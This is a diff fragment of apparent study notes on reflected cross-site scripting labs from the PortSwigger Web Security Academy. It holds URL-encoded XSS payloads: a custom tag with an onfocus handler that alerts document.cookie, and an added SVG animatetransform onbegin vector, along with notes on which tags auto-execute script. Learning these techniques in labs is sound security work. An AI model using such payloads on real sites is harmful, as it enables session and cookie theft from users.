@@ -13,8 +13,9 @@ eg  ------>
 location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
 </script>
 IV reflected xss with SVG allowed
+https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
 
-
+find how each tags work and what properties can be used to automatic execution of our script 
 
 NOTE::::: When the XSS context is text between HTML tags, you need to introduce 
 some new HTML tags designed to trigger execution of JavaScript.
